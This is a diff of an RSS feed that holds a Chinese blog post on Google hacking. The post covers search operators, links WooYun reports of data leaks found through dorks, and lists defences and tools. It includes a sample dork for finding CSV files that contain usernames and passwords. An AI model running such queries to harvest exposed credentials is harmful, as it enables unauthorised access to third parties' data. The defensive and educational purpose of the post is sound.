-      &lt;li&gt;OR：用于查找搜索中的一个或者另外一个关键字。也可以使用管道符号(|)达到相应效果。例如：admin | user&lt;/li&gt;
-      &lt;li&gt;注意：Google从左到右读取查询，操作符之间拥有相同优先级，且搜索不受括号影响。例如：intext:(password | passcode) intext:(username | userid | user) filetype:csv&lt;/li&gt;
-    &lt;/ul&gt;
-  &lt;/li&gt;
-  &lt;li&gt;使用Google URL:&lt;br /&gt;
- 当你提交完一个Google查询之后，可以看到相应的Google结果页面，而这个页面的URL可以用于修改一个查询的或者在以后重新使用这个查询   &lt;br /&gt;
- 例如：www.google.com.hk/search?variable1=value&amp;amp;variable2=value  &lt;br /&gt;
- 相关URL参数列表 &lt;a href=&quot;http://ylbook.com/cms/web/gugecanshu.htm&quot;&gt;Link&lt;/a&gt;&lt;/li&gt;
-&lt;/ol&gt;
-
-&lt;p&gt;##0x02 Google高级操作符##&lt;/p&gt;
-
-&lt;ol&gt;
-  &lt;li&gt;操作符语法：
-    &lt;ul&gt;
-      &lt;li&gt;基本语法：opearator:search_term&lt;/li&gt;
-      &lt;li&gt;在操作符、冒号、搜索关键字之间是没有空格的。&lt;/li&gt;
-      &lt;li&gt;布尔操作符和特殊字符（例如OR和+）仍可用于高级操作符查询，但是不能把它们放在冒号之前二把冒号和操作符分开。&lt;/li&gt;
-      &lt;li&gt;高级操作符能够和单独的查询混合使用，但是必须遵循基本Google查询语法和高级操作符语法。&lt;/li&gt;
-      &lt;li&gt;一般情况下，一个查询只能使用一次ALL操作符，而且不能和其他操作符混用。&lt;/li&gt;
-      &lt;li&gt;例如：intitle:”index of” private  这个查询将返回标题包含词组index of，而且网页的任何地方（URL、标题、文本等）包含单词private的页面。要注意的是，intitle只对词组index of起作用，而不会影响单词private，这是因为引号外的第一个空格位于词组index of之后。Google吧这个空格解释为高级操作符搜索关键字的结尾，然后接着处理查询中剩下的部分。&lt;/li&gt;
-    &lt;/ul&gt;
-  &lt;/li&gt;
-  &lt;li&gt;Google高级操作符（列举常用的）：
-    &lt;ul&gt;
-      &lt;li&gt;intitle: 在页面标题中查找字符串&lt;/li&gt;
-      &lt;li&gt;allintitle: 在页面标题中查找所有的关键字&lt;/li&gt;
-      &lt;li&gt;inurl: 在页面的URL中查找字符串&lt;/li&gt;
-      &lt;li&gt;allinurl: 在页面的URL中查找所有的关键字&lt;/li&gt;
-      &lt;li&gt;filetype: 根据文件扩展名查找特定类型的 文件，等同于ext，也需要附加搜索关键字&lt;/li&gt;
-      &lt;li&gt;site: 限定在某个特定的网站或者域搜索，也可以单独使用&lt;/li&gt;
-      &lt;li&gt;cache: 现实页面的缓存版本，但不能很好地与其他操作符或者关键字混合使用   &lt;br /&gt;
- &lt;img src=&quot;/assets/images/20150328/2.png&quot; alt=&quot;example&quot; /&gt;&lt;/li&gt;
-    &lt;/ul&gt;
-  &lt;/li&gt;
-&lt;/ol&gt;
-
-&lt;p&gt;##0x03 Google Hacking Wooyun案例：##&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;具体的Google Hacking一般性练手：
-    &lt;ul&gt;
-      &lt;li&gt;&lt;a href=&quot;http://www.wooyun.org/bugs/wooyun-2012-06968&quot;&gt;WooYun: 关于Google Hacking一些Tips&lt;/a&gt;&lt;/li&gt;
-      &lt;li&gt;&lt;a href=&quot;http://www.wooyun.org/bugs/wooyun-2013-017368&quot;&gt;WooYun: 万达集团某处未授权任意浏览MM、GG信息&lt;/a&gt;&lt;/li&gt;
-    &lt;/ul&gt;
-  &lt;/li&gt;
-  &lt;li&gt;利用网页快照收集信息，当然也可以用于匿名浏览：
-    &lt;ul&gt;
-      &lt;li&gt;&lt;a href=&quot;http://www.wooyun.org/bugs/wooyun-2014-086085&quot;&gt;WooYun: 某校服供应商sql注入漏洞导致数万学生信息泄漏极详细另带shell&lt;/a&gt;&lt;/li&gt;
-    &lt;/ul&gt;
-  &lt;/li&gt;
-  &lt;li&gt;配置文件或日志文件敏感信息泄露：
-    &lt;ul&gt;
-      &lt;li&gt;&lt;a href=&quot;http://www.wooyun.org/bugs/wooyun-2013-020012&quot;&gt;WooYun: 多家单位深信服设备敏感文件下载(补丁不及时),可成功控制设备  (3)  —大结局&lt;/a&gt;&lt;/li&gt;
-    &lt;/ul&gt;
-  &lt;/li&gt;
-  &lt;li&gt;office文档包含用户名、口令等敏感信息泄露：
-    &lt;ul&gt;
-      &lt;li&gt;&lt;a href=&quot;http://www.wooyun.org/bugs/wooyun-2014-087891&quot;&gt;WooYun: 瑞金市教育局视频会议账号及管理员名单泄露&lt;/a&gt;&lt;/li&gt;
-      &lt;li&gt;&lt;a href=&quot;http://www.wooyun.org/bugs/wooyun-2014-051023&quot;&gt;WooYun: TCL集团技术信息服务平台用户信息泄露(弱口令登录)&lt;/a&gt;&lt;/li&gt;
-    &lt;/ul&gt;
-  &lt;/li&gt;
-  &lt;li&gt;数据库挖掘配合不当配置：
-    &lt;ul&gt;
-      &lt;li&gt;&lt;a href=&quot;http://www.wooyun.org/bugs/wooyun-2014-055361&quot;&gt;WooYun: 国内某大学网站phpmyadmin配置不当，导致可通过google hack以root权限管理后台&lt;/a&gt;&lt;/li&gt;
-      &lt;li&gt;&lt;a href=&quot;http://www.wooyun.org/bugs/wooyun-2014-085697&quot;&gt;WooYun: 4399某游戏MONGOD泄露影响归纳（敏感数据库信息）&lt;/a&gt;&lt;/li&gt;
-    &lt;/ul&gt;
-  &lt;/li&gt;
-  &lt;li&gt;利用已有漏洞进行Google挖掘：
-    &lt;ul&gt;
-      &lt;li&gt;&lt;a href=&quot;http://www.wooyun.org/bugs/wooyun-2014-067058&quot;&gt;WooYun: 盛大网络旗下多个站点SQL注入打包&lt;/a&gt;&lt;/li&gt;
-      &lt;li&gt;&lt;a href=&quot;http://www.wooyun.org/bugs/wooyun-2014-081513&quot;&gt;WooYun: 万户OA未修补漏洞致多个政府&amp;amp;集团OA中招&lt;/a&gt;&lt;/li&gt;
-    &lt;/ul&gt;
-  &lt;/li&gt;
-  &lt;li&gt;相关网络设备泄露登陆入口及信息：
-    &lt;ul&gt;
-      &lt;li&gt;&lt;a href=&quot;http://www.wooyun.org/bugs/wooyun-2014-089042&quot;&gt;WooYun: 禹神国际酒店出现漏洞，可更改支付平台账号&lt;/a&gt;&lt;/li&gt;
-      &lt;li&gt;&lt;a href=&quot;http://www.wooyun.org/bugs/wooyun-2012-07282&quot;&gt;WooYun: 阿里FTP密码泄漏&lt;/a&gt;&lt;/li&gt;
-    &lt;/ul&gt;
-  &lt;/li&gt;
-  &lt;li&gt;搜索引擎爬行的那些事：
-    &lt;ul&gt;
-      &lt;li&gt;&lt;a href=&quot;http://www.wooyun.org/bugs/wooyun-2012-08604&quot;&gt;WooYun: 搜搜 搜索引擎越权爬行&lt;/a&gt;&lt;/li&gt;
-      &lt;li&gt;&lt;a href=&quot;http://www.wooyun.org/bugs/wooyun-2013-024626&quot;&gt;WooYun: 搜狗输入法泄露部分用户隐私信息&lt;/a&gt;&lt;/li&gt;
-    &lt;/ul&gt;
-  &lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;##0x04 相关防卫措施 ##&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;禁止目录列表、错误信息和不当的配置或者删除默认页面及配置&lt;/li&gt;
-  &lt;li&gt;设置Robots.txt文件和特殊的META标记阻止Crawler&lt;/li&gt;
-  &lt;li&gt;利用自动化工具和GHDB(Google Hacking Datebase)来检测自己的网站&lt;/li&gt;
-  &lt;li&gt;使用Google的Webmaster删除页面的缓存版本&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;##0x05 扩展及参考资料 ##&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;owasp-testing-guide-v4 &lt;a href=&quot;http://kennel209.gitbooks.io/owasp-testing-guide-v4/content/zh/index.html&quot;&gt;Link&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;wiki相关 &lt;a href=&quot;http://en.wikipedia.org/wiki/Google_hacking&quot;&gt;Link&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;Google Hacking技术手册 &lt;a href=&quot;http://baike.baidu.com/link?url=YBxKy0FR6zJnBiGTdk-z8gqw3IqvVcvx9Q0aDY3Ssta8X1wNGVQXhENenxQ1ffSokpoDrHLpGVZ9VQ_7GiMucK&quot;&gt;Link&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;GHDB(Google Hacking Datebase) &lt;a href=&quot;http://www.exploit-db.com/google-dorks/&quot;&gt;Link&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;工具相关：&lt;a href=&quot;http://www.bishopfox.com/resources/tools/google-hacking-diggity/&quot;&gt;Diggity Project&lt;/a&gt; &lt;a href=&quot;http://www.mcafee.com/uk/downloads/free-tools/sitedigger.aspx&quot;&gt;SiteDigger&lt;/a&gt; &lt;a href=&quot;http://yehg.net/lab/pr0js/files.php/googlehacker.zip&quot;&gt;Google Hacker&lt;/a&gt; &lt;a href=&quot;http://punkspider.hyperiongray.com/&quot;&gt;PunkSPIDER&lt;/a&gt;&lt;/p&gt;
-
-  &lt;/li&gt;
-&lt;/ul&gt;
 </description>
+        
         <pubDate>Sat, 28 Mar 2015 08:38:00 +0800</pubDate>
-        <link>/dorks/2015/03/28/basic-google-hacking.html</link>
-        <guid isPermaLink="true">/dorks/2015/03/28/basic-google-hacking.html</guid>
-        
-        
-        <category>dorks</category>
-        
+        <link>
+        /basic-google-hacking.html</link>
+        <guid isPermaLink="true">/basic-google-hacking.html</guid>
       </item>
+      
     
   </channel>
 </rss>
